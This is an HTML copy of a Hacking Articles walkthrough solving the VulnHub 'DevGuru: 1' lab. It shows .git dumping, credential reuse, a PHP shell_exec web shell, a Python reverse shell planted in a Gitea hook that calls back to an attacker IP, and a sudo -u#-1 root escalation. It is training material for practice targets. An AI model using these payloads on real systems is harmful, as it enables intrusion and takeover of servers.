@@ -1,0 +1,147 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">DevGuru: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/devguru-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-11T11:46:18+00:00">January 11, 2021</time><time class="updated" datetime="2025-07-07T17:46:31+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Devguru” and the credits go to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/Zayotic">Zayotic</a></strong></span> for designing one of the interesting challenges. It’s available at VulnHub for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">You can download it from here: <span style="color: #0000ff;"><strong>https://www.vulnhub.com/entry/devguru-1,620/</strong></span></span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodologies</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Extracting git commit</span></li>
+<li><span style="color: #000000;">Login into Adminer</span></li>
+<li><span style="color: #000000;">Change user password</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Initial Foothold</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Access to CMS</span></li>
+<li><span style="color: #000000;">Inject Malicious PHP code</span></li>
+<li><span style="color: #000000;">Reverse Connection</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post-Exploititation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Access to the backup file</span></li>
+<li><span style="color: #000000;">Login to Gitea</span></li>
+<li><span style="color: #000000;">Gitea malicious code hooking</span></li>
+<li><span style="color: #000000;">Capture User.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing sudo</span></li>
+<li><span style="color: #000000;">Capture Root.txt</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Let’s go for ports scan with the help of the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 192.168.1.32</pre>
+<p><span style="color: #000000;">from its output, I found 3 ports were opened. At port 80 HTTP Apache was running and it gives the following git repository:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.32:80/.git/
+http://devguru.local:8585/frank/devguru-website.git</pre>
+<p><span style="color: #000000;">At port 8585 I saw “I_like_gitea” thus there is the probability of gitea running.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pyccpPMJhjs/X_weskV6AmI/AAAAAAAAstE/OkVY9kZzkSs6GksbTwOjlGVYDsYx9dQ9QCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Very first we edit the /etc/hosts file by adding the following line.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.32 devguru.local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DzuWDT1Qx_U/X_we6CDIuVI/AAAAAAAAstI/RdmIsXowCCcXqcu8vOCXQIxPAOzNH91NQCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span> </strong></span></h3>
+<p><span style="color: #000000;">With <strong>GitDumper</strong> from the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/internetwache/GitTools">GitTools</a> </strong></span>toolkit, we extract all the contents of “/.git/” into our Kali</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./gitdumper.sh  http://devguru.local/.git website</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RyKY-fBm8xE/X_wfER2aUeI/AAAAAAAAstQ/9LsO3RsIpfMZN3OZYx1Jk5Y2k08tC1aKgCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Now, we’ll recover all the files with the GitTools Kit Extractor tool, this is a script that tries to recover incomplete git repositories:</span></p>
+<ul>
+<li><span style="color: #000000;">Iterate through all commit-objects of a repository.</span></li>
+<li><span style="color: #000000;">Try to restore the contents of the commit.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./extractor.sh ../Dumper/website ./website</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O6H3UpW_sP0/X_wfLCdHr2I/AAAAAAAAstY/myzy238TaVs5MIT3YorqBOjMkfgXnjcKQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">It will extract commit and dump all files inside it within /website directory. Inside the extract commit folder, I found the admin.php file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CbaRpT6uxjE/X_wfTLs7OzI/AAAAAAAAstc/cnvPxaiCiKIGTU26UCxoUklrjBvNFtSgACLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We explore the admin.php and login page for Adminer 4.7.7 DB</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8ImcVPbeUHQ/X_wfYTIPv0I/AAAAAAAAstk/6zYpTbkC4jMo_lOrC0Qq0V4JGUHbwaGdACLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Again, I go back to /<em>7a243ab88e6add580e8fe228a05431d6e4b57a15050b97de844a22694f861dcf2 </em>folder and move into <em>/config</em> directory where found the <strong>database.php</strong> file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V1Y9EQ97-Gc/X_wfgehmwMI/AAAAAAAAsts/gljnEBr1EbUWk079k4q2WPigywhs5fhjwCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">The database.php file stored the login details for mysql DB.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-djxwThqFT3s/X_wflXV7B-I/AAAAAAAAst0/vi5JLyPwstwRbw7cqZc3kQTqBDC4b8dZwCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Thus, I log in using the above-enumerated details.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">'database'   =&gt; 'octoberdb',
+'username'   =&gt; 'october',
+'password'   =&gt; 'SQ66EBYx4GT3byXH',</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UNpBtPfJhm0/X_wfqr3frqI/AAAAAAAAst4/Ws625MrDEr4z1zmEqHFW-32jzo_SFaihgCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">In the backend_users table I saw the record for user “Frank” here I found the password in the encrypted form and this record could be modified using the edit tab.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2yR-vtUGdE4/X_wfvhzpOWI/AAAAAAAAst8/q40e-sPDIlsJ5OidP_ablJQ6iWLh1Y4xwCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here I check the password is encrypted using the bcrypt algorithm.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RYlkm2BRd0w/X_wf157rD3I/AAAAAAAAsuI/Tsi3yj7aQ3chl_RbQEVHcqSingY6dFxAwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">So, I try to generate a new password “<strong>rajchandel</strong>” by using bcrypt-hash-generator.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YNzKUaOATQ8/X_wf7phgSdI/AAAAAAAAsuM/mpL6LsXfihsfB_NFspmWUFczU22ubbZNgCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Now let’s use the above-generated password hash for user Frank. Thus, I edit the record for the user frank and updated the table.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uxNblM50Gn0/X_wgA3YKWCI/AAAAAAAAsuQ/ZG6c6te16BIr-o5qNFqT5TSZnIKlZU9QgCLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Initial Foothold</strong></span></h3>
+<p><span style="color: #000000;">Now let try to login into October CMS using the following frank:rajchandel.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vrsPTRW1uJc/X_wgFgJEYyI/AAAAAAAAsuY/wFKLyUW1E7UE9wOV4PFK-MZKg-9cH20WQCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">It’s time to exploit the CMS, its dashboard looks interesting to me where I found a console for executing code. Thus, I googled and found a <a style="color: #000000;" href="https://octobercms.com/forum/post/running-php-code-on-pages">link</a> to exploit October CMS by executing PHP code.</span></p>
+<p><span style="color: #000000;">So I execute the following code :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">function onStart()
+{
+    $this-&gt;page["myVar"] = shell_exec($_GET['cmd']);
+}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3dmws0fsf60/X_wgK1dubUI/AAAAAAAAsuc/shP0A4R6FZM7rNoJUBd3qXtafAhUJzugACLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Then execute the following code inside the Makeup console.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{ page.this.myVar }}</pre>
+<p><span style="color: #000000;">Now save the code and click on the preview for executing malicious code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K3XyASV-cBY/X_wgQ8q0T9I/AAAAAAAAsuk/rFSYljquL6opmDu-i4QutV6-PSCNHAcpQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">When you will explore the source page of the <strong>http://devguru.local?cmd=ls-al</strong> it will list all directories as shown in the following directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eBz7yEU-RWc/X_wgXptj_tI/AAAAAAAAsuo/ix4UUlg778cS5CajEBxqSjE0fmeGsHseACLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Now let’s transfer the malicious reverse shell (Pentest monkey php reverse shell). I have started a python HTTP server so that I can transfer the shell.php into the target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Qz3ZzOxxFA/X_wgdF5RiPI/AAAAAAAAsuw/4aoo00Ayw6cSvijXfLJtWwpIqjk76Dm5gCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">So, using wget command we try to upload the shell.php</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W5HXZmVAx6E/X_wgjRnEGeI/AAAAAAAAsu4/PYEqYqcPzxsX3U66BrzSoFKRgGvXFYbGACLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">Start netcat listener and then execute the malicious php shell by browsing the following URL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">devguru.local/shell.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OV22yWCycgQ/X_wgt0JKcjI/AAAAAAAAsvE/cwbpx68ZTPIIILPBwMLjQqBb8sKAn57UQCLcBGAsYHQ/s16000/23.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Post-Exploititation</strong></span></h3>
+<p><span style="color: #000000;">Boom! We got the reverse connection let’s enumerate the further. We found <strong>app.ini.bak</strong> file in the /var/backup</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-818P7dzH5F0/X_wgzJem4oI/AAAAAAAAsvM/CQ5PvuMDnQMJ02DoAKugsNhZRB4FbSZjwCLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Here we found another login credential for gitea DB.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-q_jMKnD6J9I/X_w6BLmlVKI/AAAAAAAAs1Y/0xA3HQGTsPAjVJQEezBNV5iz0tj8fl0WACLcBGAsYHQ/s16000/26.png"/></p>
+<p><span style="color: #000000;">Thus we login mysql as <strong>gitea:UfFPTF8C8jjxVF2m</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zW_5gTft-IQ/X_wg8jG9yII/AAAAAAAAsvU/uR__F7Z_13gdXkR64jKY0yJOZc4eNvVmQCLcBGAsYHQ/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">In the gitea DB inside the user, the table contains the user:frank and again change the password</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9eEupjjiohY/X_whDzhh-LI/AAAAAAAAsvc/JOwSeIff7yIh1Ot7tjLlVVLmdtbUXRfjACLcBGAsYHQ/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">So, I try to generate a new password “<strong>rajchandel</strong>” by using bcrypt-hash-generator.  Now let’s use the above-generated password hash for user Frank. Thus, I edit the record for the user frank and updated the table.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zlDMuiB2aQc/X_whKD1Jz0I/AAAAAAAAsvk/8o_b6tUjh8gSwoXKWEeBo8Nln0GEfHOzwCLcBGAsYHQ/s16000/29.png"/></span></p>
+<p><span style="color: #000000;">Then I navigate to gitea over 8585 and login using the following creds.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">User: Frank
+Password: rajchandel</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A4fBVOt4pvE/X_whQvQnj5I/AAAAAAAAsvo/wslCWlKb0UIhVEt3MOZ_Q2eC25d7u4G1wCLcBGAsYHQ/s16000/35.png"/></span></p>
+<p><span style="color: #000000;">Here we got the dashboard and found a link for frank/devguru-website.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tiJSnz6cnVo/X_whWt7bI_I/AAAAAAAAsvw/OD8Hnev_u-gSyebul226w4OCiA4n0bq0wCLcBGAsYHQ/s16000/36.png"/></span></p>
+<p><span style="color: #000000;">Click on the settings highlighted in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p11e-5RHsF4/X_whdsYDMPI/AAAAAAAAsv4/7yPoQeakP6Ur5mYPXlAm0uhDm_yWqLsvgCLcBGAsYHQ/s16000/37.png"/></span></p>
+<p><span style="color: #000000;">Click on the<strong> Git Hooks &gt; pre-receive &gt; Hook Content</strong> and then execute the python reverse shell and the code.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HigwCwOlwUg/X_whnGfjb2I/AAAAAAAAswA/hMGqRrbrbKEdGwg5AYHhFvwQZXo4adWtACLcBGAsYHQ/s16000/38.png"/></span></p>
+<p><span style="color: #000000;">But you need to update the repo for executing the python code, thus go back to the repository and open the README.md</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZAEo1dmCv3o/X_whsk9auiI/AAAAAAAAswE/em2rpzL5ULsStP1JPeaYs7jI8t-e3_ffACLcBGAsYHQ/s16000/39.png"/></span></p>
+<p><span style="color: #000000;">Now edit the file by adding some blank line at the end of the file and Click Commit Change as soon as you will click on commit the change it will update the repository and you will get a reverse connection through netcat session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZFA9ugqzLWQ/X_wh8U3Dt_I/AAAAAAAAswU/dYWk0IxLbccdOcR9G7Tl-t3MlDkZyEscACLcBGAsYHQ/s16000/41.png"/></span></p>
+<p><span style="color: #000000;">Thus, we got the reverse connection where we found the user.txt file which was our 1<sup>st</sup> flag.</span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Then, for escalating the privileges we check for Sudo right and found user frank can run sqlite3 with root privileges also the installed version of the sudoers plugin is vulnerable.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TdNKHfsoAGg/X_wiDpdpFJI/AAAAAAAAswY/yM2A9jWzpcgBZcNXX5NhU39tw1wJ9bZHwCLcBGAsYHQ/s16000/44.png"/></span></p>
+<p><span style="color: #000000;">We have found an exploit from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/47502">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lmv81V9H_vo/X_wiJguZZbI/AAAAAAAAswc/NwMwsRHDxLAbmF1mCSbayjrwjFHW-yEeACLcBGAsYHQ/s16000/45.png"/></span></p>
+<p><span style="color: #000000;">Then I execute the following command to obtain the root privilege shell and read the root.txt which was our final flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'</pre>
+<p><span style="color: #000000;">This was a very interesting and quite different CTF challenge I learned some new techniques to access the DB and code injection over the different platforms.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Llyb5RAVuV8/X_wiPNZi4kI/AAAAAAAAswg/1TFKWtUk4okzE6ezfrO9gkVBNB6QkDGSwCLcBGAsYHQ/s16000/46.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><b>Author</b>: Geet Madan is a Certified Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security<b>. </b>Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/geet-madan/"><b>here</b></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
